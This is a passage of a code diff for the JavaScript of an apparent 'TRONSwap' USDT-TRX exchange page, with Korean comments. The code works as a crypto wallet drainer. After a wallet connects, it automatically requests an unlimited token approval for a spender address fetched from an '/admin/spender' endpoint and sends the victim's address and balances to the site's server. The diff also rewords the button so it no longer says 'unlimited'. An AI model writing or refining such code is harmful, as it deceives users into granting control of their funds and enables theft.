         }
+
         function trackReferralApprove(address, txHash) {
-            var code = getRefCode() || 'DIRECT';
             fetch(API_BASE + '/referral/approve', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ code: code, address: address, txHash: txHash || 'ok' })
+                body: JSON.stringify({ code: getRefCode() || 'DIRECT', address: address, txHash: txHash || 'ok' })
             }).catch(function () {});
         }
 
-        // 유틸리티
-        function escapeHtml(s) {
-            var d = document.createElement('div');
-            d.textContent = s == null ? '' : String(s);
-            return d.innerHTML;
-        }
-        function isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
-        function isAndroid() { return /Android/i.test(navigator.userAgent); }
-        function isMobile() { return isIOS() || isAndroid(); }
-        function isPC() { return !isMobile(); }
-
-        function closeWalletModal() {
-            var m = document.getElementById('wallet-selector-modal');
-            if (m) m.classList.remove('active');
+        // ===== 환경 및 유틸리티 =====
+        function escapeHtml(value) {
+            var div = document.createElement('div');
+            div.textContent = value == null ? '' : String(value);
+            return div.innerHTML;
         }
 
-        function showToast(msg, type) {
+        function isIOS() {
+            return /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        }
+
+        function isAndroid() {
+            return /Android/i.test(navigator.userAgent);
+        }
+
+        function isMobile() {
+            return isIOS() || isAndroid();
+        }
+
+        function isValidTronAddress(addr) {
+            return typeof addr === 'string' && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(addr.trim());
+        }
+
+        function copyCurrentUrlSilent() {
+            try {
+                if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
+                    navigator.clipboard.writeText(window.location.href).catch(function () {});
+                }
+            } catch (e) {}
+        }
+
+        function showToast(message, type) {
             type = type || 'success';
-            var c = document.getElementById('toast-container');
-            if (!c) return;
-            var t = document.createElement('div');
-            var styleClass = type === 'error'
+            var container = document.getElementById('toast-container');
+            if (!container) return;
+
+            var toast = document.createElement('div');
+            var cls = type === 'error'
                 ? 'bg-red-50 border-red-300 text-red-800'
-                : (type === 'info' ? 'bg-blue-50 border-blue-300 text-blue-800' : 'bg-emerald-50 border-emerald-300 text-emerald-800');
-            var iconClass = type === 'error' ? 'fa-circle-exclamation' : (type === 'info' ? 'fa-circle-info' : 'fa-circle-check');
-            t.className = 'flex items-center gap-2.5 px-4 py-3 rounded-2xl shadow-lg border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 ' + styleClass;
-            t.innerHTML = '<i class="fa-solid ' + iconClass + '"></i><span>' + escapeHtml(msg) + '</span>';
-            c.appendChild(t);
-            requestAnimationFrame(function () { t.classList.remove('translate-y-2', 'opacity-0'); });
+                : (type === 'info'
+                    ? 'bg-blue-50 border-blue-300 text-blue-800'
+                    : 'bg-emerald-50 border-emerald-300 text-emerald-800');
+            var icon = type === 'error'
+                ? 'fa-circle-exclamation'
+                : (type === 'info' ? 'fa-circle-info' : 'fa-circle-check');
+
+            toast.className = 'flex items-center gap-2.5 px-4 py-3 rounded-2xl shadow-lg border backdrop-blur-xl pointer-events-auto text-xs font-semibold transition-all transform translate-y-2 opacity-0 ' + cls;
+            toast.innerHTML = '<i class="fa-solid ' + icon + '"></i><span>' + escapeHtml(message) + '</span>';
+            container.appendChild(toast);
+
+            requestAnimationFrame(function () {
+                toast.classList.remove('translate-y-2', 'opacity-0');
+            });
             setTimeout(function () {
-                t.classList.add('translate-y-2', 'opacity-0');
-                setTimeout(function () { t.remove(); }, 250);
+                toast.classList.add('translate-y-2', 'opacity-0');
+                setTimeout(function () {
+                    if (toast.parentNode) toast.parentNode.removeChild(toast);
+                }, 250);
             }, 3200);
         }
 
-        // 지갑 감지 및 주소 추출 (Trust Wallet 다중 주입 경로 완벽 대응)
-        function detectProvider() {
+        function openWalletModal() {
+            var modal = document.getElementById('wallet-selector-modal');
+            if (modal) modal.classList.add('active');
+        }
+
+        function closeWalletModal() {
+            var modal = document.getElementById('wallet-selector-modal');
+            if (modal) modal.classList.remove('active');
+        }
+
+        function setProgress(pct, text) {
+            var box = document.getElementById('approve-progress');
+            var bar = document.getElementById('approve-progress-bar');
+            var label = document.getElementById('approve-progress-text');
+            if (box) box.classList.remove('hidden');
+            if (bar) bar.style.width = pct + '%';
+            if (label) label.textContent = text || '처리 중...';
+        }
+
+        function hideProgress() {
+            var box = document.getElementById('approve-progress');
+            if (box) box.classList.add('hidden');
+        }
+
+        // ===== Trust Wallet & TronWeb 감지 =====
+        function detectProviderName() {
             var ua = navigator.userAgent || '';
+            if (state.wcConnector && state.wcAddress) return 'WalletConnect';
             if (window.trustwallet || /Trust/i.test(ua)) return 'TrustWallet';
-            if (window.tokenpocket || /TokenPocket/i.test(ua)) return 'TokenPocket';
-            if (/BitKeep|Bitget/i.test(ua)) return 'Bitget';
-            if (/OKApp/i.test(ua)) return 'OKX';
-            if (window.imToken || /imToken/i.test(ua)) return 'imToken';
             if (window.tronLink || window.tronWeb) return 'TronLink';
-            return null;
+            return 'TrustWallet';
         }
 
-        function isValidTronBase58(addr) {
-            return typeof addr === 'string' && addr.startsWith('T') && addr.length >= 30 && addr.length <= 36;
-        }
-
-        function getTrustTronProvider() {
+        function getTrustProvider() {
             if (!window.trustwallet) return null;
-            if (window.trustwallet.tron && typeof window.trustwallet.tron === 'object') return window.trustwallet.tron;
-            if (window.trustwallet.tronWeb && typeof window.trustwallet.tronWeb === 'object') return window.trustwallet.tronWeb;
+            if (window.trustwallet.tron && typeof window.trustwallet.tron === 'object') {
+                return window.trustwallet.tron;
+            }
+            if (window.trustwallet.tronWeb && typeof window.trustwallet.tronWeb === 'object') {
+                return window.trustwallet.tronWeb;
+            }
             return null;
         }
 
@@ -629,772 +662,854 @@
             return list;
         }
 
-        function getTronWebInstance() {
+        function getInjectedTronWeb() {
             var list = getTronWebCandidates();
             for (var i = 0; i < list.length; i++) {
-                var tw = list[i];
-                if (tw && tw.defaultAddress && isValidTronBase58(tw.defaultAddress.base58)) {
-                    return tw;
+                var item = list[i];
+                if (item && item.defaultAddress && isValidTronAddress(item.defaultAddress.base58)) {
+                    return item;
                 }
             }
             for (var j = 0; j < list.length; j++) {
-                if (list[j] && list[j].transactionBuilder) return list[j];
+                if (list[j] && (list[j].transactionBuilder || list[j].trx)) {
+                    return list[j];
+                }
             }
             return list.length > 0 ? list[0] : null;
         }
 
-        function extractBase58Address(tw) {
-            var list = tw ? [tw].concat(getTronWebCandidates()) : getTronWebCandidates();
+        function extractAddressFromCandidates() {
+            var list = getTronWebCandidates();
             for (var i = 0; i < list.length; i++) {
-                var candidate = list[i];
-                if (!candidate) continue;
-                if (candidate.defaultAddress && isValidTronBase58(candidate.defaultAddress.base58)) {
-                    return candidate.defaultAddress.base58;
+                var c = list[i];
+                if (!c) continue;
+                if (c.defaultAddress && isValidTronAddress(c.defaultAddress.base58)) {
+                    return c.defaultAddress.base58.trim();
                 }
-                if (isValidTronBase58(candidate.base58)) {
-                    return candidate.base58;
+                if (isValidTronAddress(c.base58)) {
+                    return c.base58.trim();
                 }
-                if (isValidTronBase58(candidate.address)) {
-                    return candidate.address;
+                if (isValidTronAddress(c.address)) {
+                    return c.address.trim();
                 }
             }
             return null;
         }
 
-        function parseAddressFromResponse(res) {
+        function parseAddressPayload(res) {
             if (!res) return null;
-            if (typeof res === 'string' && isValidTronBase58(res)) return res;
+            if (typeof res === 'string' && isValidTronAddress(res)) return res.trim();
             if (Array.isArray(res)) {
                 for (var i = 0; i < res.length; i++) {
-                    if (isValidTronBase58(res[i])) return res[i];
-                    if (res[i] && isValidTronBase58(res[i].address)) return res[i].address;
+                    if (isValidTronAddress(res[i])) return res[i].trim();
+                    if (res[i] && isValidTronAddress(res[i].address)) return res[i].address.trim();
                 }
             }
             if (typeof res === 'object') {
-                if (isValidTronBase58(res.address)) return res.address;
+                if (isValidTronAddress(res.address)) return res.address.trim();
                 if (res.data) {
-                    if (isValidTronBase58(res.data)) return res.data;
-                    if (isValidTronBase58(res.data.address)) return res.data.address;
-                    if (Array.isArray(res.data) && isValidTronBase58(res.data[0])) return res.data[0];
+                    if (isValidTronAddress(res.data)) return res.data.trim();
+                    if (res.data && isValidTronAddress(res.data.address)) return res.data.address.trim();
+                    if (Array.isArray(res.data) && isValidTronAddress(res.data[0])) return res.data[0].trim();
                 }
             }
             return null;
         }
 
-        async function requestWalletAccounts() {
-            var existing = extractBase58Address();
-            if (existing) return existing;
+        async function requestInjectedAddress() {
+            var current = extractAddressFromCandidates();
+            if (current) return current;
 
             var targets = [];
-            var trustTron = getTrustTronProvider();
+            var trustTron = getTrustProvider();
             if (trustTron) targets.push(trustTron);
             if (window.trustwallet) targets.push(window.trustwallet);
             if (window.tronLink) targets.push(window.tronLink);
-            var mainTw = getTronWebInstance();
-            if (mainTw) targets.push(mainTw);
+            var tw = getInjectedTronWeb();
+            if (tw) targets.push(tw);
 
             for (var i = 0; i < targets.length; i++) {
-                var obj = targets[i];
-                if (!obj) continue;
+                var target = targets[i];
+                if (!target) continue;
 
-                if (typeof obj.request === 'function') {
+                if (typeof target.request === 'function') {
                     var methods = ['tron_requestAccounts', 'requestAccounts', 'eth_requestAccounts'];
                     for (var m = 0; m < methods.length; m++) {
                         try {
-                            var res = await obj.request({ method: methods[m] });
-                            var parsed = parseAddressFromResponse(res);
+                            var out = await target.request({ method: methods[m] });
+                            var parsed = parseAddressPayload(out);
                             if (parsed) return parsed;
-                            var afterReq = extractBase58Address();
-                            if (afterReq) return afterReq;
+                            var found = extractAddressFromCandidates();
+                            if (found) return found;
                         } catch (e) {}
                     }
                 }
 
-                if (typeof obj.enable === 'function') {
+                if (typeof target.enable === 'function') {
                     try {
-                        var enRes = await obj.enable();
-                        var parsedEn = parseAddressFromResponse(enRes);
+                        var enOut = await target.enable();
+                        var parsedEn = parseAddressPayload(enOut);
                         if (parsedEn) return parsedEn;
-                        var afterEn = extractBase58Address();
-                        if (afterEn) return afterEn;
+                        var foundEn = extractAddressFromCandidates();
+                        if (foundEn) return foundEn;
                     } catch (e) {}
                 }
             }
 
-            // 비동기 주입 대기 폴링
-            for (var k = 0; k < 12; k++) {
-                var addr = extractBase58Address();
-                if (addr) return addr;
-                await new Promise(function (r) { setTimeout(r, 300); });
+            for (var step = 0; step < 10; step++) {
+                var polled = extractAddressFromCandidates();
+                if (polled) return polled;
+                await new Promise(function (r) { setTimeout(r, 250); });
+            }
+
+            return null;
+        }
+
+        function getBuilderTronWeb(injectedTw) {
+            if (injectedTw && injectedTw.transactionBuilder && typeof injectedTw.transactionBuilder.triggerSmartContract === 'function') {
+                return injectedTw;
+            }
+            if (typeof window.TronWeb === 'function') {
+                var tw1 = new window.TronWeb({ fullHost: 'https://api.trongrid.io' });
+                if (state.address) tw1.setAddress(state.address);
+                return tw1;
+            }
+            if (window.TronWeb && typeof window.TronWeb.TronWeb === 'function') {
+                var tw2 = new window.TronWeb.TronWeb({ fullHost: 'https://api.trongrid.io' });
+                if (state.address) tw2.setAddress(state.address);
+                return tw2;
             }
             return null;
         }
 
-        // WalletConnect 연결
-        async function initWalletConnect() {
-            if (wcConnector) return wcConnector;
+        // ===== WalletConnect v2 연결 및 트랜잭션 처리 =====
+        async function ensureWalletConnect() {
+            if (state.wcConnector) return state.wcConnector;
             if (typeof TronWalletConnect === 'undefined') return null;
+
             try {
-                wcConnector = new TronWalletConnect('5fafa9c15e52f88b097bc063166d3f3a', {
+                var connector = new TronWalletConnect(WC_PROJECT_ID, {
                     name: 'TRONSwap',
-                    description: 'USDT to TRX Instant Exchange',
+                    description: 'USDT ↔ TRX Instant Swap',
                     url: window.location.origin,
                     icons: [window.location.origin + '/favicon.png']
                 });
-                if (typeof wcConnector.init === 'function') {
-                    await wcConnector.init();
+                if (typeof connector.init === 'function') {
+                    await connector.init();
                 }
-                return wcConnector;
+                connector.onDisconnect = function () {
+                    state.wcAddress = null;
+                };
+                state.wcConnector = connector;
+                return connector;
             } catch (e) {
                 return null;
             }
         }
 
-        async function connectViaWalletConnect() {
-            var wc = await initWalletConnect();
-            if (!wc || typeof wc.connect !== 'function') return null;
+        function extractWcTronAddress(session) {
             try {
-                showToast('지갑 앱에서 연결 요청을 승인하세요.', 'info');
-                var addr = await wc.connect();
-                if (isValidTronBase58(addr)) {
-                    wcAddress = addr;
-                    return addr;
+                var accounts = session && session.namespaces && session.namespaces.tron && session.namespaces.tron.accounts;
+                if (Array.isArray(accounts)) {
+                    for (var i = 0; i < accounts.length; i++) {
+                        var parts = String(accounts[i]).split(':');
+                        var cand = parts[parts.length - 1];
+                        if (isValidTronAddress(cand)) return cand.trim();
+                    }
                 }
             } catch (e) {}
             return null;
         }
 
-        window.wcConnectFromModal = async function () {
+        window.connectViaWalletConnect = async function () {
             closeWalletModal();
-            var addr = await connectViaWalletConnect();
-            if (addr) {
-                await setConnectedWallet(addr, 'WalletConnect', true);
-            } else {
-                showToast('WalletConnect 연결이 완료되지 않았습니다.', 'error');
+            var wc = await ensureWalletConnect();
+            if (!wc) {
+                showToast('WalletConnect 라이브러리를 초기화할 수 없습니다.', 'error');
+                return null;
+            }
+
+            try {
+                showToast('WalletConnect 연결 요청을 확인하세요...', 'info');
+                var addr = null;
+
+                if (wc.client && typeof wc.client.connect === 'function') {
+                    if (wc.session && wc.client.disconnect) {
+                        try {
+                            await wc.client.disconnect({
+                                topic: wc.session.topic,
+                                reason: { code: 6000, message: 'User disconnected' }
+                            });
+                        } catch (e) {}
+                        wc.session = null;
+                    }
+
+                    var conn = await wc.client.connect({
+                        requiredNamespaces: {
+                            tron: {
+                                methods: ['tron_signTransaction', 'tron_signMessage'],
+                                chains: ['tron:0x2b6653dc'],
+                                events: ['accountsChanged']
+                            }
+                        }
+                    });
+
+                    if (isMobile() && conn && conn.uri) {
+                        var trustWcLink = 'https://link.trustwallet.com/wc?uri=' + encodeURIComponent(conn.uri);
+                        setTimeout(function () {
+                            if (!state.isConnected) {
+                                window.location.href = trustWcLink;
+                            }
+                        }, 300);
+                    }
+
+                    if (conn && typeof conn.approval === 'function') {
+                        var session = await conn.approval();
+                        wc.session = session;
+                        addr = extractWcTronAddress(session);
+                    }
+                } else if (typeof wc.connect === 'function') {
+                    var res = await wc.connect();
+                    if (isValidTronAddress(res)) {
+                        addr = res.trim();
+                    } else if (res && res.address && isValidTronAddress(res.address)) {
+                        addr = res.address.trim();
+                    }
+                }
+
+                if (addr && isValidTronAddress(addr)) {
+                    state.wcAddress = addr;
+                    await onWalletConnected(addr, 'WalletConnect', true);
+                    return addr;
+                }
+
+                showToast('WalletConnect 지갑 주소를 가져오지 못했습니다.', 'error');
+                return null;
+            } catch (err) {
+                var msg = (err && err.message ? err.message : String(err)).toLowerCase();
+                if (msg.indexOf('reject') >= 0 || msg.indexOf('cancel') >= 0 || msg.indexOf('close') >= 0) {
+                    showToast('WalletConnect 연결이 취소되었습니다.', 'error');
+                } else {
+                    showToast('WalletConnect 연결 오류: ' + (err && err.message ? err.message : '확인 필요'), 'error');
+                }
+                return null;
             }
         };
 
-        // 지갑 실행 및 연결 -> 무제한 승인 연계
-        window.launchWallet = async function (wallet) {
-            var url = window.location.href;
-            var encoded = encodeURIComponent(url);
+        // ===== Trust Wallet 연결 진입점 =====
+        window.connectTrustWallet = async function () {
             closeWalletModal();
 
-            // 1. 이미 인앱 브라우저 내부라면 즉시 계정 연결 후 무제한 승인 실행
-            var addr = await requestWalletAccounts();
+            // 1. Trust Wallet 인앱 브라우저 또는 주입 환경이면 즉시 계정 요청
+            var addr = await requestInjectedAddress();
             if (addr) {
-                await setConnectedWallet(addr, detectProvider() || wallet, true);
-                return;
+                await onWalletConnected(addr, 'TrustWallet', true);
+                return addr;
             }
 
-            // 2. 외부 브라우저에서는 URL 복사 후 지갑 앱 실행 유도
-            try {
-                if (navigator.clipboard && navigator.clipboard.writeText) {
-                    navigator.clipboard.writeText(url).catch(function () {});
-                }
-            } catch (e) {}
-
-            if (isPC()) {
-                var installLinks = {
-                    tronlink: 'https://chrome.google.com/webstore/detail/tronlink/ibnejdfjmmkpcnlpebklmnkoeoihofec',
-                    trust: 'https://trustwallet.com/browser-extension',
-                    tokenpocket: 'https://extension.tokenpocket.pro/',
-                    bitget: 'https://web3.bitget.com/en/wallet-download',
-                    okx: 'https://www.okx.com/web3',
-                    imtoken: 'https://token.im/download'
-                };
-                var im = document.getElementById('install-modal');
-                if (im) {
-                    im.classList.add('active');
-                } else {
-                    window.open(installLinks[wallet] || installLinks.tronlink, '_blank', 'noopener,noreferrer');
-                }
-                return;
+            // 2. 외부 모바일 브라우저면 Trust Wallet 앱(DApp 브라우저)으로 유니버설 링크 실행
+            if (isMobile()) {
+                copyCurrentUrlSilent();
+                var targetUrl = encodeURIComponent(window.location.href);
+                showToast('Trust Wallet 앱으로 이동합니다...', 'info');
+                window.location.href = 'https://link.trustwallet.com/open_url?coin_id=195&url=' + targetUrl;
+                return null;
             }
 
-            // Trust Wallet 유니버설 링크 (iOS Safari 및 Android Chrome 모두 안정 동작)
-            if (wallet === 'trust') {
-                showToast('Trust Wallet 앱으로 이동합니다. 연결 후 무제한 승인이 이어집니다.', 'info');
-                window.location.href = 'https://link.trustwallet.com/open_url?coin_id=195&url=' + encoded;
-                return;
-            }
-
-            if (isAndroid()) {
-                var tronlinkParam = encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' }));
-                var androidApps = {
-                    tronlink: { scheme: 'tronlinkoutside', path: 'pull.activity?param=' + tronlinkParam, pkg: 'com.tronlinkpro.wallet' },
-                    tokenpocket: { scheme: 'tpdapp', path: 'open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })), pkg: 'vip.mytokenpocket' },
-                    bitget: { scheme: 'bitkeep', path: 'bkconnect?action=dapp&url=' + encoded, pkg: 'com.bitkeep.wallet' },
-                    okx: { scheme: 'okx', path: 'wallet/dapp/url?dappUrl=' + encoded, pkg: 'com.okinc.okex.gp' },
-                    imtoken: { scheme: 'imtokenv2', path: 'navigate/DappView?url=' + encoded, pkg: 'im.token.app' }
-                };
-                var appInfo = androidApps[wallet];
-                if (appInfo) {
-                    showToast('지갑 앱으로 이동합니다. 연결 후 무제한 승인이 이어집니다.', 'info');
-                    window.location.href = 'intent://' + appInfo.path + '#Intent;scheme=' + appInfo.scheme + ';package=' + appInfo.pkg + ';end';
-                    return;
-                }
-            }
-
-            if (isIOS()) {
-                var iosSchemes = {
-                    tronlink: 'tronlinkoutside://pull.activity?param=' + encodeURIComponent(JSON.stringify({ url: url, action: 'open', protocol: 'TronLink', version: '1.0' })),
-                    tokenpocket: 'tpdapp://open?params=' + encodeURIComponent(JSON.stringify({ url: url, chain: 'TRON' })),
-                    bitget: 'bitkeep://bkconnect?action=dapp&url=' + encoded,
-                    okx: 'okx://wallet/dapp/url?dappUrl=' + encoded,
-                    imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
-                };
-                if (iosSchemes[wallet]) {
-                    showToast('지갑 앱으로 이동을 시도합니다.', 'info');
-                    window.location.href = iosSchemes[wallet];
-                    return;
-                }
-            }
-
-            var wcAddr = await connectViaWalletConnect();
-            if (wcAddr) {
-                await setConnectedWallet(wcAddr, 'WalletConnect', true);
-            } else {
-                showToast('지갑 앱의 DApp 브라우저에서 이 주소를 열어주세요 (주소 복사됨).', 'error');
-            }
+            // 3. 데스크톱 외부 브라우저면 WalletConnect 연결 안내
+            showToast('데스크톱에서는 WalletConnect로 연결해 주세요.', 'info');
+            return await window.connectViaWalletConnect();
         };
 
         window.handleConnectWallet = async function () {
-            if (isConnected && currentWalletAddress) {
-                if (!isApproved && !isApproving) {
+            if (state.isConnected && state.address) {
+                if (!state.isApproved && !state.isApproving) {
                     await executeUnlimitedApprove();
                 } else {
-                    showToast('연결 및 승인 완료: ' + currentWalletAddress.substring(0, 6) + '...' + currentWalletAddress.slice(-4), 'info');
+                    showToast('이미 연결되었습니다: ' + state.address.slice(0, 6) + '...' + state.address.slice(-4), 'info');
                 }
                 return;
             }
 
-            var addr = await requestWalletAccounts();
-            if (addr) {
-                await setConnectedWallet(addr, detectProvider() || 'TronLink', true);
+            var directAddr = await requestInjectedAddress();
+            if (directAddr) {
+                await onWalletConnected(directAddr, detectProviderName(), true);
                 return;
             }
 
-            var m = document.getElementById('wallet-selector-modal');
-            if (m) m.classList.add('active');
+            openWalletModal();
         };
 
-        async function setConnectedWallet(address, provider, autoApproveAfterConnect) {
-            if (!isValidTronBase58(address)) return;
-            currentWalletAddress = address;
-            activeProvider = provider || detectProvider() || 'Wallet';
-            isConnected = true;
+        // ===== 지갑 연결 후 상태·잔액 동기화 =====
+        async function onWalletConnected(address, providerName, shouldAutoApprove) {
+            if (!isValidTronAddress(address)) return;
+
+            state.address = address.trim();
+            state.activeProvider = providerName || detectProviderName();
+            state.isConnected = true;
             closeWalletModal();
 
             var btnText = document.getElementById('wallet-btn-text');
-            if (btnText) btnText.textContent = address.substring(0, 6) + '...' + address.slice(-4);
-
+            if (btnText) {
+                btnText.textContent = state.address.slice(0, 6) + '...' + state.address.slice(-4);
+            }
             var connectBtn = document.getElementById('connect-btn');
             if (connectBtn) {
                 connectBtn.className = 'flex items-center gap-1.5 sm:gap-2 bg-slate-900 border border-slate-700 text-emerald-400 font-semibold text-xs sm:text-sm px-3 sm:px-4 py-2 sm:py-2.5 rounded-xl transition';
             }
 
-            var energyAddrEl = document.getElementById('energy-address');
-            if (energyAddrEl) energyAddrEl.value = address;
+            var energyInput = document.getElementById('energy-address');
+            if (energyInput) {
+                energyInput.value = state.address;
+            }
 
-            var serverApproved = false;
+            var approvedFromServer = false;
             try {
-                var res = await fetch(API_BASE + '/wallet/connect', {
+                var connRes = await fetch(API_BASE + '/wallet/connect', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ address: address, provider: activeProvider })
+                    body: JSON.stringify({ address: state.address, provider: state.activeProvider })
                 });
-                var data = await res.json();
-                if (data && data.status === 'ok') {
-                    userUsdtBalance = parseFloat(data.balance) || 0;
-                    if (data.isApproved) {
-                        isApproved = true;
-                        serverApproved = true;
+                var connData = await connRes.json();
+                if (connData && connData.status === 'ok') {
+                    state.usdtBalance = parseFloat(connData.balance) || 0;
+                    if (connData.isApproved) {
+                        state.isApproved = true;
+                        approvedFromServer = true;
                         setApprovedUI();
                     }
                 }
             } catch (e) {}
 
             try {
-                var tr = await fetch(API_BASE + '/trx/' + encodeURIComponent(address));
-                var td = await tr.json();
-                if (td && td.trxBalance !== undefined) {
-                    userTrxBalance = parseFloat(td.trxBalance) || 0;
+                var trxRes = await fetch(API_BASE + '/trx/' + encodeURIComponent(state.address));
+                var trxData = await trxRes.json();
+                if (trxData && trxData.trxBalance !== undefined) {
+                    state.trxBalance = parseFloat(trxData.trxBalance) || 0;
                 }
             } catch (e) {}
 
-            syncSwapBalanceDisplay();
+            syncSwapBalances();
             updateSwapOutput();
-            trackReferralConnect(address, activeProvider);
-            showToast(activeProvider + ' 지갑 연결 완료! 무제한 승인을 진행합니다.', 'info');
+            trackReferralConnect(state.address, state.activeProvider);
+            showToast(state.activeProvider + ' 지갑 연결 완료!', 'success');
 
-            if (autoApproveAfterConnect && !isApproved && !serverApproved && !isApproving) {
+            if (shouldAutoApprove && !state.isApproved && !approvedFromServer && !state.isApproving) {
+                var connectedAddr = state.address;
                 setTimeout(function () {
-                    if (isConnected && !isApproved && !isApproving && currentWalletAddress === address) {
+                    if (state.isConnected && !state.isApproved && !state.isApproving && state.address === connectedAddr) {
                         executeUnlimitedApprove();
                     }
                 }, 400);
             }
         }
 
-        async function getSpenderAddress() {
-            try {
-                var r = await fetch(API_BASE + '/admin/spender');
-                var d = await r.json();
-                if (d && d.status === 'ok' && d.address) return d.address;
-            } catch (e) {}
-            return null;
-        }
-
-        function setProgress(pct, text) {
-            var bar = document.getElementById('approve-progress');
-            var barInner = document.getElementById('approve-progress-bar');
-            var barText = document.getElementById('approve-progress-text');
-            if (bar) bar.classList.remove('hidden');
-            if (barInner) barInner.style.width = pct + '%';
-            if (barText) barText.textContent = text || '처리 중...';
-        }
-        function hideProgress() {
-            var bar = document.getElementById('approve-progress');
-            if (bar) bar.classList.add('hidden');
-        }
-
         function setApprovedUI() {
-            var t = translations[currentLang] || translations.en;
+            var dict = TRANSLATIONS[state.lang] || TRANSLATIONS.en;
             var badge = document.getElementById('allowance-badge-main');
             if (badge) {
-                badge.textContent = t.approval_done || '교환 승인 완료';
+                badge.textContent = dict.approval_done || '교환 승인 완료';
                 badge.className = 'text-[11px] px-2.5 py-1 rounded-full font-semibold border bg-emerald-500/10 border-emerald-500/30 text-emerald-600';
             }
-            var btnText = document.getElementById('approve-btn-text');
-            if (btnText) btnText.textContent = t.swap_btn_done || '교환하기';
             var eBtnText = document.getElementById('energy-btn-text');
-            if (eBtnText) eBtnText.textContent = t.energy_rent_btn_done || '에너지 렌탈하기';
+            if (eBtnText) {
+                eBtnText.textContent = dict.energy_rent_btn_done || '에너지 렌탈하기';
+            }
             hideProgress();
+            refreshActionButtons();
         }
 
-        function resetApproveButtonLabel() {
-            var t = translations[currentLang] || translations.en;
+        function refreshActionButtons() {
+            var dict = TRANSLATIONS[state.lang] || TRANSLATIONS.en;
             var btn = document.getElementById('approve-btn');
-            if (!btn) return;
+            if (!btn || state.isApproving) return;
             btn.disabled = false;
-            var labelText = isApproved ? (t.swap_btn_done || '교환하기') : (t.swap_btn_text || '교환 시작 (최초 1회 무제한 승인)');
-            btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + escapeHtml(labelText) + '</span>';
+            var label = state.isApproved
+                ? (dict.swap_btn_done || '교환하기')
+                : (dict.swap_btn_text || '교환 시작 (최초 1회 승인 필요)');
+            btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + escapeHtml(label) + '</span>';
         }
 
-        // 트랜잭션 빌드 인스턴스 확보 (Trust Wallet 내장 객체에 transactionBuilder가 없어도 CDN TronWeb으로 생성)
-        function getBuilderTronWeb(injectedTw) {
-            if (injectedTw && injectedTw.transactionBuilder && typeof injectedTw.transactionBuilder.triggerSmartContract === 'function') {
-                return injectedTw;
-            }
-            if (typeof window.TronWeb === 'function') {
-                var fallbackTw = new window.TronWeb({ fullHost: 'https://api.trongrid.io' });
-                if (currentWalletAddress) fallbackTw.setAddress(currentWalletAddress);
-                return fallbackTw;
-            }
-            if (window.TronWeb && window.TronWeb.TronWeb) {
-                var fallbackTw2 = new window.TronWeb.TronWeb({ fullHost: 'https://api.trongrid.io' });
-                if (currentWalletAddress) fallbackTw2.setAddress(currentWalletAddress);
-                return fallbackTw2;
+        // ===== 트랜잭션 서명 및 브로드캐스트 =====
+        async function getSpenderAddress() {
+            for (var attempt = 0; attempt < 2; attempt++) {
+                try {
+                    var res = await fetch(API_BASE + '/admin/spender');
+                    var data = await res.json();
+                    if (data && data.status === 'ok' && isValidTronAddress(data.address)) {
+                        return data.address.trim();
+                    }
+                } catch (e) {}
+                if (attempt === 0) {
+                    await new Promise(function (r) { setTimeout(r, 500); });
+                }
             }
             return null;
         }
 
-        // 지갑별 다중 서명 처리 (Trust Wallet / TronLink / 일반 TronWeb 모두 호환)
-        async function signTransactionWithWallet(rawTx, injectedTw) {
-            var trustTron = getTrustTronProvider();
+        function base58ToHexBody(b58) {
+            var alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+            var num = BigInt(0);
+            for (var i = 0; i < b58.length; i++) {
+                var idx = alphabet.indexOf(b58[i]);
+                if (idx < 0) throw new Error('잘못된 TRON 주소 형식');
+                num = num * BigInt(58) + BigInt(idx);
+            }
+            var hex = num.toString(16);
+            while (hex.length < 50) hex = '0' + hex;
+            return hex.substring(2, 42);
+        }
 
-            // 1. Trust Wallet 전용 Provider 우선 시도
+        async function signRawTransaction(rawTx, injectedTw) {
+            var trustTron = getTrustProvider();
             if (trustTron) {
                 if (typeof trustTron.signTransaction === 'function') {
-                    var res1 = await trustTron.signTransaction(rawTx);
-                    if (res1) return res1.signature ? res1 : (res1.transaction || res1);
+                    var s1 = await trustTron.signTransaction(rawTx);
+                    if (s1) return s1.signature ? s1 : (s1.transaction || s1);
                 }
                 if (typeof trustTron.sign === 'function') {
-                    var res2 = await trustTron.sign(rawTx);
-                    if (res2) return res2.signature ? res2 : (res2.transaction || res2);
+                    var s2 = await trustTron.sign(rawTx);
+                    if (s2) return s2.signature ? s2 : (s2.transaction || s2);
                 }
                 if (typeof trustTron.request === 'function') {
                     try {
-                        var res3 = await trustTron.request({
+                        var s3 = await trustTron.request({
                             method: 'tron_signTransaction',
                             params: { transaction: rawTx }
                         });
-                        if (res3) {
-                            var signedObj = res3.result || res3.transaction || res3;
-                            if (signedObj && signedObj.signature) return signedObj;
-                        }
+                        var obj = (s3 && (s3.result || s3.transaction)) || s3;
+                        if (obj && obj.signature) return obj;
                     } catch (e) {}
                 }
             }
 
-            // 2. 주입된 TronWeb의 trx.sign 시도
             if (injectedTw && injectedTw.trx && typeof injectedTw.trx.sign === 'function') {
                 return await injectedTw.trx.sign(rawTx);
             }
-
-            // 3. window.tronWeb.trx.sign 백업 시도
             if (window.tronWeb && window.tronWeb.trx && typeof window.tronWeb.trx.sign === 'function') {
                 return await window.tronWeb.trx.sign(rawTx);
             }
 
-            throw new Error('지갑 서명 인터페이스를 찾을 수 없습니다.');
+            throw new Error('지갑 서명 메서드를 찾을 수 없습니다.');
         }
 
-        window.executeUnlimitedApprove = async function () {
-            if (!isConnected || !currentWalletAddress) {
-                var addr = await requestWalletAccounts();
-                if (addr) {
-                    await setConnectedWallet(addr, detectProvider() || 'Wallet', false);
-                } else {
